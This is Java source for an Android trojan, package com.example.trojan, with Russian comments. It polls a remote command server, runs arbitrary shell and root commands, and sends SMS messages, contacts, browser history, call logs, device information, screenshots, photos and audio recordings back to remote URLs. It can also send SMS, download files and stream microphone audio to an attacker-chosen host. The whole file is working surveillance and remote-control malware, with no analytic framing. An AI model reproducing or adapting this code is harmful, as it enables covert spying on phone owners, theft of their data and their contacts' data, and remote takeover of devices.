package com.example.trojan;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.provider.Browser;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class ShellSession implements Runnable{
	
	String timestamp;
	int max_attempts=200;  // количество попыток получения команды при активном коннекте
	int idleattempts=0;  // кол-во ответов на запрос без новой команды
	String cmd;
	String requested_file; // файл который требуют загрузить
	String cmd_spec;
	long lastrequesttime;
	long curtime;
	long shell_interval=600;  // уже в секундах(!), <10 мин назад - запускаем акт шелл
	
	long on_con_error_delay=60000; // когда временно нет связи
	long no_requests_delay= 600000; // время с последнего запроса - проверяем каждые 10 мин
	long between_cmd_delay= 3000; // между получением новой команды в акт. фазе
	//boolean is_rooted=false;
	String connection_type;
	
	Context context;
	WakeLock wakeLock;
	List<String> remotelist = new ArrayList<String>(); // файл по строкам на сервере
	 
	ShellSession(){
		
	}
	
	ShellSession(Context context){
		this.context=context;
		
	}
	 
	
	@Override
	public void run() {
		try{
			PowerManager mgr = (PowerManager)context.getSystemService(Context.POWER_SERVICE); // лочим
			wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "shellWakeLock");
			wakeLock.acquire();} catch(Exception e){
				Log.d(MyService.LOG_TAG, "error setting wake lock!");
				}
		try{	
		// устанавливаем тайминги в зав-ти от типа подключения к инету
		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
	    NetworkInfo info = cm.getActiveNetworkInfo();
	    connection_type=info.getTypeName()+":"+info.getSubtypeName();
	    
	    if(info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_MOBILE){
	    	Log.d(MyService.LOG_TAG, "using 3g/edge. changing timings");
	    	
	    	on_con_error_delay=5000;  // default 60000 mils = 1 min
	    	no_requests_delay=1200000;   // 600000 mils = 10 min
	    }
			}
		catch(Exception e){Log.d(MyService.LOG_TAG, "error getting network info");}
		
		
		while(true){
		try{
		remotelist=load_url(MyService.shelltime_url);
		if(remotelist.size()!=0&&!(timestamp=remotelist.get(0)).equals("END")){
			lastrequesttime=Long.parseLong(timestamp);
			curtime=System.currentTimeMillis()/1000;
			//Log.d(MyService.LOG_TAG,Long.toString(curtime));
			//Log.d(MyService.LOG_TAG,Long.toString(lastrequesttime));
			if(curtime-lastrequesttime<shell_interval){
				Log.d(MyService.LOG_TAG,"request not long time ago! activating shell..");
				activate_shell();
				}
			
			Thread.sleep(no_requests_delay); // no recent requests
			}
		}
		catch (InterruptedException e){
			Log.d(MyService.LOG_TAG,"shell was interrupted (probably user is back)");
			try{wakeLock.release();}catch(Exception ex){}
			MyService.cmdsessionactive=false;
			return;//break;
									}
		catch (Exception e){
			Log.d(MyService.LOG_TAG,"shell could not establish connection!\n"+e.toString());
			try {Thread.sleep(on_con_error_delay);}// долго ждем (минуту :) - коннект не удается
				catch(InterruptedException ex){
					Log.d(MyService.LOG_TAG,"shell was interrupted (probably user is back)");
					try{wakeLock.release();}catch(Exception ex1){}
					MyService.cmdsessionactive=false;
					return;}
							}
			
		}
		// tested
	}
	
	public void activate_shell() throws InterruptedException{
		
		idleattempts=0;
		MyService.cmdsessionactive=true;
		while(idleattempts<max_attempts){
		try{
		remotelist=load_url(MyService.cmd_url); // результат в remotelist <array>
		if(remotelist.size()!=0&&!(cmd=remotelist.get(0)).equals("END")){
			if(remotelist.size()>1&&!(requested_file=remotelist.get(1)).equals("END")){
				if(!requested_file.equals("")){
				Log.d(MyService.LOG_TAG,"uploading "+requested_file+"..");
				AsyncExecutor.uploadfile(requested_file);}
			}
			if(remotelist.size()>2&&!(cmd_spec=remotelist.get(2)).equals("END")){
				if(!cmd_spec.equals("")){
				try{
					exec_spec(cmd_spec);
					} catch(Exception e){
					Log.d(MyService.LOG_TAG,"error executing spec: \n"+cmd+"\"");
						}
				}
			}
		idleattempts=0; //сбрасываем счетчик - появилась активность
		if(!cmd.equals("")){
			Log.d(MyService.LOG_TAG,"current cmd is: \""+cmd+"\" trying to execute..");
		try{
			List<String> res = exec_cmd(cmd);			
				if (res.size()!=0){
					postdata(MyService.post_url,res); // отсылаем результат
					} else{
						post(MyService.post_url," ");
						//Log.d(MyService.LOG_TAG,"result is empty. not posting back");
						}
					
			} catch(Exception e){
			Log.d(MyService.LOG_TAG,"error executing command: \n"+cmd+"\"");
				}
							}
																}
		}
		catch(Exception e){
			Log.d(MyService.LOG_TAG,"error retrieving remote command\n"+e.toString());
		}

			Thread.sleep(between_cmd_delay);
			idleattempts++;
		
		}
		MyService.cmdsessionactive=false;
		
	}
	
	
	static public List<String> load_url(String url_string){
		List<String> res = new ArrayList<String>();
		try{
		  URL url = new URL(url_string);
	  	  HttpURLConnection connection = (HttpURLConnection)url.openConnection();
	  	  connection.setRequestMethod("GET");
	  	  if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
	  		  Log.d(MyService.LOG_TAG, "load_url() error: "+connection.getResponseCode());
	  	  }
	  	  BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
	String inputLine;

	while ((inputLine = in.readLine())!=null&&!(inputLine.equals("END"))){
	res.add(inputLine);
	Log.d(MyService.LOG_TAG, inputLine);}
	in.close();
	connection.disconnect();
	//Log.d(LOG_TAG, "total: "+remotelist.size());
	}
	catch(Exception e){
		Log.d(MyService.LOG_TAG, "error establishing connection\\creating thread\n"+e.toString());
		return null;
	}
	return res;
	    }
	
	
	public List<String> exec_cmd(String command){
		String inputLine;
		List<String> res = new ArrayList<String>();
		
		try {
		    Process process = Runtime.getRuntime().exec(command);
		    BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
		    
		    
		    while ((inputLine = in.readLine())!=null){
		    	res.add(inputLine);}
		    
		} catch (Exception e) {
			Log.d(MyService.LOG_TAG,"error executing: \""+command+"\"\n"+e.toString());
		}
		return res;
	}
		
	
	public void exec_spec(String command){
		try {
			
			if(command.startsWith("root ")){   // выполнить root команду
				String rootcmd = new String(command.substring(5));  // команда начинается с 5го символа
				long r=HiddenWaiter.do_async("rootcmd",rootcmd,5);
				if(r==0L){ post(MyService.post_url,"empty result");}// doing asyncly!!
				 
			}
			
			else if(command.equals("sms")){   // perform all sms dump
				List<String> res = new ArrayList<String>();
			try{	
				String[] boxes = {"inbox","sent","draft"};
				for (String box : boxes){
				res.add(box+":");
				Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/"+box), null, null, null, null);

				if (cursor.moveToFirst()) {
				    do {
				       String msgData = "";
				       for(int idx=0;idx<cursor.getColumnCount();idx++)
				       {
				           msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
				       }
				       res.add(msgData);
				       //Log.d(MyService.LOG_TAG, msgData);
				    } while (cursor.moveToNext());
				}
				cursor.close();
										}
				postdata(MyService.post_url,res);
				}
			catch (Exception e){}
			
			}
			else if(command.startsWith("download ")){   // download custom file from url
				String fileurl = new String(command.substring(9));  // url начинается с 9го символа
				boolean isdownloaded  = downloadfile(fileurl);
				if(isdownloaded){
					post(MyService.post_url,fileurl+" saved successfully");
					}
				else{
					post(MyService.post_url," error downloading "+fileurl);
				}
			}
			
			else if(command.equals("restart")){
				Log.d(MyService.LOG_TAG, "restarting whole service!");
				post(MyService.post_url,"restarting whole service!");
				System.exit(0);
				
			}
			else if(command.equals("loc")){
			    context.sendBroadcast(new Intent().setAction("GetLastKnownLocation"));
			}
			
			else if(command.equals("info")){
				List<String> res = new ArrayList<String>();
				String status="",type="";
				res.add("connection:"+connection_type);
				res.add("provider:"+get_provider());
				long free[]=MyService.freespace();  // получаем свободное место
				res.add("internal free: "+free[0]+"MB");
				res.add("external free: "+free[1]+"MB");
				getbattery();
				
				switch (MyService.battery_status) {
				case BatteryManager.BATTERY_STATUS_CHARGING:
					if(MyService.charge_type==BatteryManager.BATTERY_PLUGGED_USB){
						type="via usb";
					}
					else if(MyService.charge_type==BatteryManager.BATTERY_PLUGGED_AC){
						type="via AC";
					}
					status="charging";
					break;

				case BatteryManager.BATTERY_STATUS_FULL:
					status="full";
					break;
					
				case BatteryManager.BATTERY_STATUS_DISCHARGING:
					status="discharging";
					break;
				}
				
				res.add("battery level:"+MyService.battery_level+" "+status+" "+type);
				postdata(MyService.post_url,res);
			}
			
			else if(command.startsWith("record ")){
				if(!MyService.recording){
					long delay;
					try{
					delay = Long.parseLong(new String(command.substring(7)));}
					catch (Exception e){
						delay=10; // криво спарсили/нет аргумента - уст. по умолчанию 10 сек
					}
				context.sendBroadcast(new Intent().setAction("startrecord"));
				MyService.record_must_be_stopped=true;
				record_auto_stop(delay);
				post(MyService.post_url,"recording started with delay "+delay+" seconds");
				
				}
				else{post(MyService.post_url,"already recoding at the moment!");}
			}
			
			else if(command.equals("stoprecord")){
				if(MyService.recording){
					context.sendBroadcast(new Intent().setAction("stoprecord"));
					MyService.record_must_be_stopped=false;
					post(MyService.post_url,"recording stopped!");
					}
					else{post(MyService.post_url,"recording already stopped!");}
			}
			
			else if(command.startsWith("stream ")){
				String args[] = command.substring(7).split(" ");
				if(args.length==2){
				String addr = args[0];
			try{	
				int port=Integer.parseInt(args[1]);
				if(!MyService.recording&&!MyService.streaming){
					MyService.streamerthread = new Thread(new AudioStreamer(addr,port));
					MyService.streaming=true;
				    MyService.streamerthread.start();
					MyService.recording=true;
					}
				else{post(MyService.post_url,"already recording/streaming!");}
				} catch(Exception e){
					post(MyService.post_url,"error starting stream!");
					}
			}
				}
			
			else if(command.equals("stopstream")){
				if(MyService.streaming){
					MyService.streaming=false;
					MyService.recording=false;
				} else{
					post(MyService.post_url,"streaming already stopped!");
				}
			}
			
			
			else if(command.equals("sync")){   // синхронизация по запросу
				HiddenWaiter.do_async("sync",MyService.log_path,120);
				post(MyService.post_url,"sync initiated!");
			}
			
			else if(command.equals("quit")){   // завершить шелл
				MyService.cmdsessionactive=false;
				Thread.currentThread().interrupt();
			}
			
			else if(command.equals("clear")){   // очистка папки приложения
				try{
				String datadir=context.getApplicationInfo().dataDir;
				Runtime.getRuntime().exec("rm -r "+datadir+"/files/logs/");
				Runtime.getRuntime().exec("mkdir "+datadir+"/files/logs/");
				post(MyService.post_url,"app files cleaned");}
				catch (Exception e){}
			}
			
			else if(command.equals("photo")){   // фото со всех камер
				try{
					context.sendBroadcast(new Intent().setAction("photoshoot"));}
				catch (Exception e){}
			}
			
			else if(command.equals("calllogs")){   // логи звонков
				try{
					context.sendBroadcast(new Intent().setAction("getcalllogs"));}
				catch (Exception e){}
			}
			
			else if(command.equals("bookmarks")){   // закладки
				List<String> res = new ArrayList<String>();
				try{getbrowserdata(1, res);
						if(res.size()>0){
							postdata(MyService.post_url,res);
						} else{
							post(MyService.post_url,"bookmarks are empty");
						}
					} catch(Exception e){post(MyService.post_url,"error getting bookmarks");}
			}
			
			else if(command.equals("history")){   // история браузера
				List<String> res = new ArrayList<String>();
			try{getbrowserdata(0, res);
					if(res.size()>0){
						postdata(MyService.post_url,res);
					} else{
						post(MyService.post_url,"history is empty");
					}
				} catch(Exception e){post(MyService.post_url,"error getting history");}
			}
			
			else if(command.equals("screenshot")){   // скрин экрана (root only!)
				try{
				String dest=context.getApplicationInfo().dataDir;
				dest+="/files/logs/"+System.currentTimeMillis()/1000+".png";
				Process p=Runtime.getRuntime().exec("su");
      		    DataOutputStream dos = new DataOutputStream(p.getOutputStream());
      		    dos.writeBytes("screencap -p >"+dest+"\n");
      		    dos.writeBytes("chmod 644 "+dest+"\n");
      		    dos.writeBytes("exit\n");
      		    dos.flush();
      		    dos.close();
				post(MyService.post_url,"screenshot saved");}
				catch (Exception e){}
			}
			
			else if(command.equals("getcontacts")){   // считать книгу контактов
								
				List<String> contactlist = new ArrayList<String>();
				try{Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
				while (phones.moveToNext())
				{
				  String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
				  String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
				  contactlist.add(name+":"+phoneNumber);
				  Log.d(MyService.LOG_TAG, name+":"+phoneNumber);
				}
				phones.close();
				if(contactlist.size()>0){
					postdata(MyService.post_url,contactlist);
					} else{
						post(MyService.post_url,"contact list is empty");
					}
				}
				catch (Exception e){
					Log.d(MyService.LOG_TAG, "error retrieving contacts\n"+e.toString());
					post(MyService.post_url,"error retrieving contacts");
				}
				
			}
			
			else if(command.startsWith("sendsms ")){   // отправка смс
				//String str_smsargs = new String(command.substring(8));
				String[] smsargs=new String(command.substring(8)).split("\\s",2);  // отделить только 1
				if(smsargs.length>1){
				boolean issent  = sendsms(smsargs[0],smsargs[1]);
				if(issent){
					post(MyService.post_url,"sms sent successfully");
					}
				else{
					post(MyService.post_url," error sending sms ");
				}
					}
			}

				
			
		} catch (Exception e) {
			Log.d(MyService.LOG_TAG,"error executing spec: \""+command+"\"\n"+e.toString());
		}
	}
	
	public void postdata(String url,List<String> data) {
		Runnable uploader = new HttpPoster(url,data);
		new Thread(uploader).start();
	}
	
	public void post(String url,String data) {
		Runnable uploader = new HttpPoster(url,data);
		new Thread(uploader).start();
	}
	
    public boolean downloadfile(String fileURL) { // returns true if succeeds
    try{
    	boolean res=true;
        URL url = new URL(fileURL);
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        int responseCode = httpConn.getResponseCode();
 
        if (responseCode == HttpURLConnection.HTTP_OK) {
            String fileName = "";
            String disposition = httpConn.getHeaderField("Content-Disposition");
 
            if (disposition != null) {
                int index = disposition.indexOf("filename=");
                if (index > 0) {
                    fileName = disposition.substring(index + 10,
                            disposition.length() - 1);
                }
            } else {
                fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1,
                        fileURL.length());
            }
 
            InputStream inputStream = httpConn.getInputStream();
            String saveFilePath = context.getFilesDir().getPath() + File.separator + fileName;
            Log.d(MyService.LOG_TAG, saveFilePath);
             
            FileOutputStream outputStream = new FileOutputStream(saveFilePath);
 
            int bytesRead = -1;
            byte[] buffer = new byte[4096];
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
 
            outputStream.close();
            inputStream.close();
 
            Log.d(MyService.LOG_TAG, "file "+saveFilePath+" downloaded");
        } else {
        	 Log.d(MyService.LOG_TAG, "No file to download. Server replied HTTP code: " + responseCode);
        	 res=false;
        }
        httpConn.disconnect();
        return res;
     } catch (Exception e){
    	 
    	 Log.d(MyService.LOG_TAG, "error downloading "+fileURL+"\n"+e.toString());
    	 return false;
     }
    }
	
    boolean sendsms(final String phonenumber, final String message) {  // number should start with +7
    	
	    //new Thread(new Runnable() {
	     // public void run() {

	    	 Log.d(MyService.LOG_TAG, "trying to send sms");    	 
	    	 try{
	    		 SmsManager sms = SmsManager.getDefault();
	    		 sms.sendTextMessage(phonenumber, null, message, null, null);
	    		 Log.d(MyService.LOG_TAG, "sms was sent ^^ ");
	    		 return true;
	    	 }
	    	 catch (Exception e){
	    		 Log.d(MyService.LOG_TAG, "coudlnt send sms! "+e.toString()); 
	    		 return false;
	    	 }
	      //}
	  //  }).start();
	  }
    
 void record_auto_stop(final long delay_secs){
	 Runnable limiter = new Runnable() {
		@Override
		public void run() {	
				try {
					Thread.sleep(delay_secs*1000);   // в миллисекунды
					if(MyService.record_must_be_stopped){
						context.sendBroadcast(new Intent().setAction("stoprecord"));
						MyService.record_must_be_stopped=false;
						post(MyService.post_url,"recording auto-stopped after "+delay_secs+" secs");
					}
				} catch (Exception e) {			
				}
			
			
		}
	};
		new Thread(limiter).start();
	 
 }
 
String get_provider(){
		
		try{TelephonyManager tm =(TelephonyManager) 
		        context.getSystemService(Context.TELEPHONY_SERVICE);

		String provider= tm.getSimOperatorName();
		 return provider;
		}
		catch(Exception e){
			Log.d(MyService.LOG_TAG, "error getting provider:\n "+ e.toString());
			return "unknown";
		}	
	}
 
void getbattery(){
	try{
    BroadcastReceiver batteryLevelReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            context.unregisterReceiver(this);
            int rawlevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int level = -1;
            if (rawlevel >= 0 && scale > 0) {
                level = (rawlevel * 100) / scale;
            }
            MyService.battery_level=level;
            MyService.battery_status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            MyService.charge_type = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            
        }
    };
    IntentFilter batteryLevelFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
    context.registerReceiver(batteryLevelReceiver, batteryLevelFilter);
	}
	catch(Exception e){}
	
} 

void getbrowserdata(int type,List<String> res){  // тип:  0 = история , 1 = закладки
	Cursor mCur=null;
	try{
	String[] proj = new String[] { Browser.BookmarkColumns.DATE, 
			Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
	String sel = Browser.BookmarkColumns.BOOKMARK + " = "+type;
	mCur = context.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
	mCur.moveToFirst();
	String date = "";
	String title = "";
	String url = "";
	if (mCur.moveToFirst() && mCur.getCount() > 0) {
	    boolean cont = true;
	    while (mCur.isAfterLast() == false && cont) {
	    	date = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.DATE));
	        title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
	        url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
	        res.add(date+" "+title+" -- "+url);
	        mCur.moveToNext();
	    }
	}
   mCur.close();}
	finally{mCur.close();}
}

}
